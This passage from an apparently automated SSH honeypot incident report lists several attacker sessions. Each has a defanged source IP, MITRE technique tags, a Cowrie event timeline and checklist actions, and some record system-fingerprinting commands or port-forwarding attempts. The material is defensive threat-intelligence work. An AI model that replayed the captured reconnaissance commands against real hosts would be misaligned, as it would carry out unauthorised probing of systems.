| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:09 |
| **Last Seen** | 2026-08-15 04:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:09:46` | `cowrie.session.connect` |
| `2026-08-15 04:09:46` | `cowrie.client.version` |
| `2026-08-15 04:09:46` | `cowrie.client.kex` |
| `2026-08-15 04:09:49` | `cowrie.login.success` |
| `2026-08-15 04:09:52` | `cowrie.session.params` |
| `2026-08-15 04:09:52` | `cowrie.command.input` |
| `2026-08-15 04:09:52` | `cowrie.command.input` |
| `2026-08-15 04:09:52` | `cowrie.command.input` |
| `2026-08-15 04:09:52` | `cowrie.command.input` |
| `2026-08-15 04:09:52` | `cowrie.command.input` |
| `2026-08-15 04:09:52` | `cowrie.command.success` |
| `2026-08-15 04:09:52` | `cowrie.command.input` |
| `2026-08-15 04:09:52` | `cowrie.command.input` |
| `2026-08-15 04:09:52` | `cowrie.command.input` |
| `2026-08-15 04:09:52` | `cowrie.command.input` |
| `2026-08-15 04:09:52` | `cowrie.log.closed` |
| `2026-08-15 04:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee13360aff7d

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 04:11 |
| **Last Seen** | 2026-08-15 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:11:19` | `cowrie.session.connect` |
| `2026-08-15 04:11:19` | `cowrie.client.version` |
| `2026-08-15 04:11:19` | `cowrie.client.kex` |
| `2026-08-15 04:11:20` | `cowrie.login.success` |
| `2026-08-15 04:11:20` | `cowrie.session.params` |
| `2026-08-15 04:11:20` | `cowrie.command.input` |
| `2026-08-15 04:11:21` | `cowrie.log.closed` |
| `2026-08-15 04:11:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-125b4a27e72a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:12 |
| **Last Seen** | 2026-08-15 04:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:12:05` | `cowrie.session.connect` |
| `2026-08-15 04:12:05` | `cowrie.client.version` |
| `2026-08-15 04:12:05` | `cowrie.client.kex` |
| `2026-08-15 04:12:08` | `cowrie.login.success` |
| `2026-08-15 04:12:10` | `cowrie.session.params` |
| `2026-08-15 04:12:10` | `cowrie.command.input` |
| `2026-08-15 04:12:10` | `cowrie.command.input` |
| `2026-08-15 04:12:10` | `cowrie.command.input` |
| `2026-08-15 04:12:10` | `cowrie.command.input` |
| `2026-08-15 04:12:10` | `cowrie.command.input` |
| `2026-08-15 04:12:10` | `cowrie.command.success` |
| `2026-08-15 04:12:10` | `cowrie.command.input` |
| `2026-08-15 04:12:10` | `cowrie.command.input` |
| `2026-08-15 04:12:10` | `cowrie.command.input` |
| `2026-08-15 04:12:10` | `cowrie.command.input` |
| `2026-08-15 04:12:10` | `cowrie.log.closed` |
| `2026-08-15 04:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e5bf6d86018

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:14 |
| **Last Seen** | 2026-08-15 04:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:14:22` | `cowrie.session.connect` |
| `2026-08-15 04:14:23` | `cowrie.client.version` |
| `2026-08-15 04:14:23` | `cowrie.client.kex` |
| `2026-08-15 04:14:25` | `cowrie.login.success` |
| `2026-08-15 04:14:27` | `cowrie.session.params` |
| `2026-08-15 04:14:27` | `cowrie.command.input` |
| `2026-08-15 04:14:27` | `cowrie.command.input` |
| `2026-08-15 04:14:27` | `cowrie.command.input` |
| `2026-08-15 04:14:27` | `cowrie.command.input` |
| `2026-08-15 04:14:27` | `cowrie.command.input` |
| `2026-08-15 04:14:27` | `cowrie.command.success` |
| `2026-08-15 04:14:27` | `cowrie.command.input` |
| `2026-08-15 04:14:27` | `cowrie.command.input` |
| `2026-08-15 04:14:27` | `cowrie.command.input` |
| `2026-08-15 04:14:27` | `cowrie.command.input` |
| `2026-08-15 04:14:28` | `cowrie.log.closed` |
| `2026-08-15 04:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c3ba07a4dc1

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 04:16 |
| **Last Seen** | 2026-08-15 04:16 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:16:12` | `cowrie.session.connect` |
| `2026-08-15 04:16:17` | `cowrie.client.version` |
| `2026-08-15 04:16:17` | `cowrie.client.kex` |
| `2026-08-15 04:16:39` | `cowrie.login.success` |
| `2026-08-15 04:16:51` | `cowrie.session.params` |
| `2026-08-15 04:16:51` | `cowrie.command.input` |
| `2026-08-15 04:16:56` | `cowrie.log.closed` |
| `2026-08-15 04:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3caded1884e8

| Field | Detail |
|---|---|
| **Source IP** | `59.93.36[.]136` |
| **First Seen** | 2026-08-15 04:17 |
| **Last Seen** | 2026-08-15 04:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:17:16` | `cowrie.session.connect` |
| `2026-08-15 04:17:17` | `cowrie.client.version` |
| `2026-08-15 04:17:17` | `cowrie.client.kex` |
| `2026-08-15 04:17:21` | `cowrie.login.success` |
| `2026-08-15 04:17:21` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.93.36[.]136` to AbuseIPDB if not already reported
- [ ] Block `59.93.36[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4c98eb898f4

| Field | Detail |
|---|---|
| **Source IP** | `36.93.154[.]207` |
| **First Seen** | 2026-08-15 04:17 |
| **Last Seen** | 2026-08-15 04:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:17:27` | `cowrie.session.connect` |
| `2026-08-15 04:17:28` | `cowrie.client.version` |
| `2026-08-15 04:17:30` | `cowrie.client.kex` |
| `2026-08-15 04:17:32` | `cowrie.login.success` |
| `2026-08-15 04:17:33` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.154[.]207` to AbuseIPDB if not already reported
- [ ] Block `36.93.154[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbbb0332e29a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:18 |
| **Last Seen** | 2026-08-15 04:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:18:48` | `cowrie.session.connect` |
| `2026-08-15 04:18:48` | `cowrie.client.version` |
| `2026-08-15 04:18:48` | `cowrie.client.kex` |
| `2026-08-15 04:18:50` | `cowrie.login.success` |
| `2026-08-15 04:18:51` | `cowrie.session.params` |
| `2026-08-15 04:18:51` | `cowrie.command.input` |
| `2026-08-15 04:18:51` | `cowrie.command.input` |
| `2026-08-15 04:18:51` | `cowrie.command.input` |
| `2026-08-15 04:18:51` | `cowrie.command.input` |
| `2026-08-15 04:18:51` | `cowrie.command.input` |
| `2026-08-15 04:18:51` | `cowrie.command.success` |
| `2026-08-15 04:18:51` | `cowrie.command.input` |
| `2026-08-15 04:18:51` | `cowrie.command.input` |
| `2026-08-15 04:18:51` | `cowrie.command.input` |
| `2026-08-15 04:18:51` | `cowrie.command.input` |
| `2026-08-15 04:18:51` | `cowrie.log.closed` |
| `2026-08-15 04:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42083a74714b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:20 |
| **Last Seen** | 2026-08-15 04:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:20:54` | `cowrie.session.connect` |
| `2026-08-15 04:20:55` | `cowrie.client.version` |
| `2026-08-15 04:20:55` | `cowrie.client.kex` |
| `2026-08-15 04:20:57` | `cowrie.login.success` |
| `2026-08-15 04:20:58` | `cowrie.session.params` |
| `2026-08-15 04:20:58` | `cowrie.command.input` |
| `2026-08-15 04:20:58` | `cowrie.command.input` |
| `2026-08-15 04:20:58` | `cowrie.command.input` |
| `2026-08-15 04:20:58` | `cowrie.command.input` |
| `2026-08-15 04:20:58` | `cowrie.command.input` |
| `2026-08-15 04:20:58` | `cowrie.command.success` |
| `2026-08-15 04:20:58` | `cowrie.command.input` |
| `2026-08-15 04:20:58` | `cowrie.command.input` |
| `2026-08-15 04:20:58` | `cowrie.command.input` |
| `2026-08-15 04:20:58` | `cowrie.command.input` |
| `2026-08-15 04:20:58` | `cowrie.log.closed` |
| `2026-08-15 04:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29e6afdbee6e

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-08-15 04:22 |
| **Last Seen** | 2026-08-15 04:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:22:21` | `cowrie.session.connect` |
| `2026-08-15 04:22:21` | `cowrie.client.version` |
| `2026-08-15 04:22:21` | `cowrie.client.kex` |
| `2026-08-15 04:22:22` | `cowrie.login.success` |
| `2026-08-15 04:22:23` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7b432dddb84

| Field | Detail |
|---|---|
| **Source IP** | `219.129.236[.]174` |
| **First Seen** | 2026-08-15 04:22 |
| **Last Seen** | 2026-08-15 04:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:22:30` | `cowrie.session.connect` |
| `2026-08-15 04:22:30` | `cowrie.client.version` |
| `2026-08-15 04:22:30` | `cowrie.client.kex` |
| `2026-08-15 04:22:33` | `cowrie.login.success` |
| `2026-08-15 04:22:34` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.129.236[.]174` to AbuseIPDB if not already reported
- [ ] Block `219.129.236[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e51948420b08

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:22 |
| **Last Seen** | 2026-08-15 04:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:22:54` | `cowrie.session.connect` |
| `2026-08-15 04:22:54` | `cowrie.client.version` |
| `2026-08-15 04:22:54` | `cowrie.client.kex` |
| `2026-08-15 04:22:55` | `cowrie.login.success` |
| `2026-08-15 04:22:56` | `cowrie.session.params` |
| `2026-08-15 04:22:56` | `cowrie.command.input` |
| `2026-08-15 04:22:56` | `cowrie.command.input` |
| `2026-08-15 04:22:56` | `cowrie.command.input` |
| `2026-08-15 04:22:56` | `cowrie.command.input` |
| `2026-08-15 04:22:57` | `cowrie.command.input` |
| `2026-08-15 04:22:57` | `cowrie.command.success` |
| `2026-08-15 04:22:57` | `cowrie.command.input` |
| `2026-08-15 04:22:57` | `cowrie.command.input` |
| `2026-08-15 04:22:57` | `cowrie.command.input` |
| `2026-08-15 04:22:57` | `cowrie.command.input` |
| `2026-08-15 04:22:57` | `cowrie.log.closed` |
| `2026-08-15 04:22:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37d4655d1e8c

| Field | Detail |
|---|---|
| **Source IP** | `122.187.230[.]183` |
| **First Seen** | 2026-08-15 04:24 |
| **Last Seen** | 2026-08-15 04:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:24:41` | `cowrie.session.connect` |
| `2026-08-15 04:24:42` | `cowrie.client.version` |
| `2026-08-15 04:24:42` | `cowrie.client.kex` |
| `2026-08-15 04:24:44` | `cowrie.login.success` |
| `2026-08-15 04:24:45` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:24:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.230[.]183` to AbuseIPDB if not already reported
- [ ] Block `122.187.230[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4859c008928

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:24 |
| **Last Seen** | 2026-08-15 04:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:24:48` | `cowrie.session.connect` |
| `2026-08-15 04:24:49` | `cowrie.client.version` |
| `2026-08-15 04:24:49` | `cowrie.client.kex` |
| `2026-08-15 04:24:50` | `cowrie.login.success` |
| `2026-08-15 04:24:51` | `cowrie.session.params` |
| `2026-08-15 04:24:51` | `cowrie.command.input` |
| `2026-08-15 04:24:51` | `cowrie.command.input` |
| `2026-08-15 04:24:51` | `cowrie.command.input` |
| `2026-08-15 04:24:51` | `cowrie.command.input` |
| `2026-08-15 04:24:51` | `cowrie.command.input` |
| `2026-08-15 04:24:51` | `cowrie.command.success` |
| `2026-08-15 04:24:51` | `cowrie.command.input` |
| `2026-08-15 04:24:51` | `cowrie.command.input` |
| `2026-08-15 04:24:51` | `cowrie.command.input` |
| `2026-08-15 04:24:51` | `cowrie.command.input` |
| `2026-08-15 04:24:51` | `cowrie.log.closed` |
| `2026-08-15 04:24:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0143a999fa2d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:26 |
| **Last Seen** | 2026-08-15 04:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:26:48` | `cowrie.session.connect` |
| `2026-08-15 04:26:48` | `cowrie.client.version` |
| `2026-08-15 04:26:49` | `cowrie.client.kex` |
| `2026-08-15 04:26:49` | `cowrie.login.success` |
| `2026-08-15 04:26:51` | `cowrie.session.params` |
| `2026-08-15 04:26:51` | `cowrie.command.input` |
| `2026-08-15 04:26:51` | `cowrie.command.input` |
| `2026-08-15 04:26:51` | `cowrie.command.input` |
| `2026-08-15 04:26:51` | `cowrie.command.input` |
| `2026-08-15 04:26:51` | `cowrie.command.input` |
| `2026-08-15 04:26:51` | `cowrie.command.success` |
| `2026-08-15 04:26:51` | `cowrie.command.input` |
| `2026-08-15 04:26:51` | `cowrie.command.input` |
| `2026-08-15 04:26:51` | `cowrie.command.input` |
| `2026-08-15 04:26:51` | `cowrie.command.input` |
| `2026-08-15 04:26:51` | `cowrie.log.closed` |
| `2026-08-15 04:26:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2c58f9386fc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:28 |
| **Last Seen** | 2026-08-15 04:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:28:49` | `cowrie.session.connect` |
| `2026-08-15 04:28:49` | `cowrie.client.version` |
| `2026-08-15 04:28:49` | `cowrie.client.kex` |
| `2026-08-15 04:28:51` | `cowrie.login.success` |
| `2026-08-15 04:28:53` | `cowrie.session.params` |
| `2026-08-15 04:28:53` | `cowrie.command.input` |
| `2026-08-15 04:28:53` | `cowrie.command.input` |
| `2026-08-15 04:28:53` | `cowrie.command.input` |
| `2026-08-15 04:28:53` | `cowrie.command.input` |
| `2026-08-15 04:28:53` | `cowrie.command.input` |
| `2026-08-15 04:28:53` | `cowrie.command.success` |
| `2026-08-15 04:28:53` | `cowrie.command.input` |
| `2026-08-15 04:28:53` | `cowrie.command.input` |
